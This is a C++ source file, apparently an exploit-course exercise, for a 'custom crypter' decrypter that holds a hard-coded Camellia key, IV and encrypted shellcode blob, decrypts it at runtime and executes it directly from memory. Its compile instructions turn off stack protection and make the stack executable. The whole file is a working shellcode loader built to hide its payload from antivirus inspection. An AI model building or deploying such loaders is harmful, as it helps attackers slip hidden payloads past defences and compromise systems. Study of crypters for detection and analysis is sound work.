/* 
 * Title:    Custom Crypter (decrypter.cpp)
 * Platform: Linux/x86
 * Date:     2015-04-28
 * Author:   Julien Ahrens (@MrTuxracer)
 * Website:  http://www.rcesecurity.com 
 * Based on: https://www.cryptopp.com/wiki/Camellia
 *
 * Instructions:
 * Compile using (on x64):
 * g++ -I/usr/include/cryptopp decrypter.cpp -o decrypter -m32 -lcryptopp -fno-stack-protector -z execstack
*/

#include <string.h>

#include <iostream>
using std::cerr;
using std::endl;

#include <string>
using std::string;

#include <cstdlib>
using std::exit;

#include "cryptlib.h"
using CryptoPP::Exception;

#include "hex.h"
using CryptoPP::HexDecoder;

#include "filters.h"
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;

#include "camellia.h"
using CryptoPP::Camellia;

#include "modes.h"
using CryptoPP::CBC_Mode;

/*
 * Set decryption parameters
 * ciphertext - contains the hex-encoded encrypted ciphertxt generated by crypter.cpp
 * key - contains the encryption key
 * iv - contains the encryption initialization vector (IV)
*/
string key="93CF010790B98320AFB80CD4379F61A13ED42149E2AC5F97C0D64B174AE9D175";
string iv="15F9231F2A7E9857FED744B4E2ED4727";
string ciphertext="B168876255FFB588193F9AE76B7D0E04C1A084CEAF08F2AE20908D67017D1EA4394E1BF042A2347D5C9F2001E635FA9121646757122EF543F59D6D61C091A4CD66AA5D9379ADB306BA8A092D0803D6749AE4661720FBF5963733E4C280F587B2B29AC0DBF5BEBF4BBD5DDBFFAC0895307E858839DEFC6CE318D1F5C37BE6F06E7F78DECCF40D4883E89E27BBE430A3EE930DB79A4D66837AF01BA5A0992056DFEF0A5D6ECB366422A35DB0FCBFEF10CC5A70679F7C650D63F68FF82D0B0CFC86F1AC2FA3EA740CBF58D3CE2123B13C20D6ADD0D93BA208C671F2EBF170DB34658A96A3BDC2F5A83069A2804E8BC5B02F518C8B076DC4C9AA80A95D01EE3555DF";

/*
 * Function to decode strings using CryptoPP's HexDecoder to a StringSink
 * input("encoded") is decoded to output("decoded")
 * pumpAll is set to true to get the whole data at once
*/
string decode(const string &encoded)
{
	string decoded;   
	StringSource ssrc(encoded, true,
		new HexDecoder(
			new StringSink(decoded)
		) 
	);
	return decoded;
}

int main(int argc, char* argv[]) {
	// Decode ciphertext, key and IV
	string decoded_cipher = decode(ciphertext);
	string decoded_key = decode(key);	
	string decoded_iv = decode(iv);	
	
	// Convert the key and IV StringSink to const byte * because it's later needed in SetKeyWithIV()
	const byte* b_decoded_key = (const byte*) decoded_key.data();
	const byte* b_decoded_iv = (const byte*) decoded_iv.data();
		
	// String to store the decrypted contents to
	string recovered;
	
	// To make sure that CryptoPP exceptions are catched
 	try
	{
		// Set encryption cipher (Camellia with CBC mode)
		CBC_Mode< Camellia >::Decryption d;
		// Set encryption parameters (Key and IV)
		d.SetKeyWithIV(b_decoded_key, Camellia::MAX_KEYLENGTH, b_decoded_iv);

		// Process with encryption and output decrypted string to "recovered"
		// (The StreamTransformationFilter removes padding as required)
		StringSource s(decoded_cipher, true, 
			new StreamTransformationFilter(d,
				new StringSink(recovered)
			) 
		); 
	}
	// Catch exceptions if they occur during decryption
	catch(const CryptoPP::Exception& e)
	{
		cerr << e.what() << endl;
		exit(1);
	}
	
	// Convert the decoded data to a char
	char * writable = new char[recovered.size()];
	std::copy(recovered.begin(), recovered.end(), writable);
	
	// Execute the shellcode
	int (*ret)() = (int(*)())writable;
	ret();
	
    return 0;
}
